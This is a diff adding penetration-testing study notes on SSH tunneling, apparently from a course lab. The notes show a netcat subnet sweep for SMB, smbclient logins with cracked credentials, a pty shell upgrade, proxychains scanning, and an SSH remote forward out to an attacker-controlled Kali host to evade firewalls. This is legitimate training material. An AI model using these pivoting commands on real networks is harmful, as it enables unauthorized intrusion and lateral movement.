@@ -1,1 +1,122 @@
+SSH tunneling
+Tunneling describes the act of encapsulating one kind of data stream within another as it travels across a network. 
+Certain protocols called tunneling protocols are designed specifically to do this. 
+Secure Shell (SSH) is an example of one of these encapsulating data stream within data stream protocols.
 
+Another great benefit of SSH tunneling is how its use can easily blend into the background traffic of network environments.
+It's also increasingly common to find OpenSSH6 client software installed on Windows hosts.
+SSH traffic will look much like regular administrative traffic.
+
+In most official documentation, tunneling data through an SSH connection is referred to as SSH port forwarding
+
+SSH Local Port Forwading
+SSH local port forwarding adds a small twist to this. 
+With SSH local port forwarding, packets are not forwarded by the same host that listens for packets. 
+Instead, an SSH connection is made between two hosts (an SSH client and an SSH server), a listening port is opened by the SSH client, and all packets received on this port are tunneled through the SSH connection to the SSH server. 
+The packets are then forwarded by the SSH server to the socket we specify.
+
+
+
+Using a bash loop with Netcat to sweep for port 445 in the newly-found subnet:
+Bash Script for NC portscan
+A Bash for-loop to sweep for hosts with an open port 445 on the /24 subnet. 
+We can use Netcat to make the connections, passing the -z flag to check for a listening port without sending data, -v for verbosity, and -w set to 1 to ensure a lower time-out threshold.
+
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
+
+We find a host with a Server Message Block (SMB) server open (on TCP port 445) in that subnet. 
+We want to be able to connect to that server for cyclical enumeration and download what we find to our Kali machine
+
+The alternative is to use SSH local port forwarding. 
+A local port forward can be set up using OpenSSH's -L option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). 
+The first socket is the listening socket that will be bound to the SSH client machine. 
+The second socket is where we want to forward the packets to. 
+The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.
+
+In this case, we will instruct SSH to listen on all interfaces on port 4455 on machine1 (0.0.0.0:4455), then forward all packets (through the SSH tunnel to machine2) to port 445 on the newly-found host (172.16.50.x:445).
+
+We're listening on port 4455 on CONFLUENCE01 because we're running as the confluence user: we don't have the permissions to listen on any port below 1024.
+
+Let's create the SSH connection  
+We'll pass the local port forwarding argument we just put together to -L, and use -N to prevent a shell from being opened.
+
+SSH Local Port Forward
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 admin@10.4.50.x  <-- -L for local pf and -N to prevent shell open
+
+Once we've entered the password, we don't receive any output. 
+When running SSH with the -N flag, this is normal. 
+The -N flag prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.
+If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the -v flag to ssh in order to receive debug output.
+
+It is - great! Connecting to port 4455 on machine will now be just like connecting directly to port 445 on 172.16.50.x.  
+
+
+We can now interact with port 4455 on machine1 from our Kali machine. 
+Let's start by listing the available shares with smbclient's -L option, passing 4455 to the custom port -p option, along with the username to the -U option and the password to the --password option. 
+We'll try the credentials we cracked for the hr_admin user from the database.
+
+kali@kali:~$ smbclient -p 4455 -L //192.168.50.x/ -U hr_admin --password=Welcome1234
+smbclient -p 4455 //192.168.50.x/scripts -U hr_admin --password=Welcome1234
+
+
+SSH Dynamic Port Forwarding
+In SSH dynamic port fowarding, packets can be sent to a single listening SOCKS port on the SSH client machine. 
+These will be pushed through the SSH connection, then forwarded to anywhere the SSH server machine can route. 
+The only limitation is that the packets have to be properly formatted - most often by SOCK-compatible client software. 
+In some cases, software is not SOCKS-compatible by default. 
+We will work through this limitation later in this section.
+
+We can ensure that we're in a TTY shell using Python3's pty module. We will create our SSH connection to machine1 using the database_admin credentials again. In OpenSSH, a dynamic port forward is created with the -D option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell from being spawned.
+
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.x
+
+proxychains smbclient -L //172.16.50.x/ -U hr_admin --password=Welcome1234
+    smbclient connecting to HRSHARES through the SOCKS proxy using Proxychains.
+
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.x
+
+
+SSH Remote Port Forwarding
+In our examples so far, we've been able to connect to any port we bind on the WAN interface of CONFLUENCE01. 
+This is more challenging in the real world because, more often than not, firewalls - both hardware and software - are likely to get in the way. 
+Inbound traffic is often controlled much more aggressively than outbound traffic.
+
+However, we will more often be able to SSH out of a network. 
+Outbound connections are more difficult to control than inbound connections. 
+Most corporate networks will allow many types of common network traffic out - including SSH - for reasons of simplicity, usability, and business need. 
+So while it likely won't be possible to connect to a port we bind to the network perimeter, it will often be possible to SSH out.
+
+No inbound traffic allowed? SSH out to an attacker controlled ssh server, bind the listening port there
+
+SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. 
+We can think of it like a reverse shell, but for port forwarding.
+
+Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.
+Because of the firewall, we can't create any port forward that requires opening the listening port on machine1.
+
+However, machine1 does have an SSH client, and we can set up an SSH server on our Kali machine.
+
+
+We can connect from machine1 to our Kali machine over SSH. 
+The listening TCP port 2345 is bound to the loopback interface on our Kali machine. 
+Packets sent to this port are pushed by the Kali SSH server through the SSH tunnel back to the SSH client on machine1. 
+They are then forwarded to the PostgreSQL database port on PGDATABASE.
+
+First, we'll need to enable the SSH server on our attacking Kali machine. 
+OpenSSH server is preinstalled - all we need to do is start it.
+Before you start the Kali SSH server, make sure you've set a strong, unique password for the Kali user!
+
+Checking that the SSH server on the Kali machine is listening.
+Starting the SSH server on the Kali machine.
+sudo systemctl start ssh
+
+We can check that the SSH port is open as we expected using ss.
+kali@kali:~$ sudo ss -ntplu 
+
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
+tcp   LISTEN 0      128             [::]:22           [::]:*     users:(("sshd",pid=181432,fd=4))
+
+
+ssh -N -R 127.0.0.1:2345:10.4.50.x:5432 kali@192.168.118.x
